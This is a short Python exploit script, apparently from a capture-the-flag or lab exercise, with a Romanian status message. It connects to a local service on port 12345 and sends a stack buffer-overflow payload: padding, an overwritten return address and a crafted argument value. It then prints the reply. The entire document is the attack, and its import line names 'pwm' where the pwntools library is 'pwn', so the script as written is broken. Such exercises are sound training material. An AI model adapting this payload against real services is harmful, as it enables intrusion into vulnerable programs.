from pwm import *
host="127.0.0.1"
port = 12345

conn=remote(host,port)
print(f"conectat la {host}:{port}")

message=b"\xaa\xaa\xaa\xaa"+b"A"*74+b'\xf8\x97\x04\x08' + b"D" *4 + b'\x3c\x7f\x33\x31'
conn.send(message)
conn.shutdown("send")
response=conn.recvall()
try:
    print(response.decode("utf-8"))
except UnicodeDecodeError:
    print(response)